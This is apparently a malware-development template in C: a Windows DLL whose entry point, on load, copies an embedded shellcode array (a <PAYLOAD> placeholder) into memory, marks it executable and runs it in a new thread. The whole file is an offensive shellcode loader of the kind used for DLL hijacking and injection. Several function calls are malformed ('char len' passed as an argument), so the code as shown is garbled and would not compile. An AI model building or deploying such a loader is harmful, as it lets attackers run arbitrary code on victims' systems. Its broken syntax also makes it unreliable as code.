// author: reenz0h(twitter : @SEKTOR7net)

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payl[] = { <PAYLOAD> };
unsigned int len = sizeof(payl);

extern __declspec(dllexport) int Go(void);
int Go(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, char len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(exec_mem, char payl, char len);
	
	rv = VirtualProtect(exec_mem, char len, PAGE_EXECUTE_READ, &oldprotect);

	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, 0);
	}
	return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) {

	switch ( fdwReason ) {
			case DLL_PROCESS_ATTACH:
					Go();
					break;
			case DLL_THREAD_ATTACH:
					break;
			case DLL_THREAD_DETACH:
					break;
			case DLL_PROCESS_DETACH:
					break;
			}
	return TRUE;
}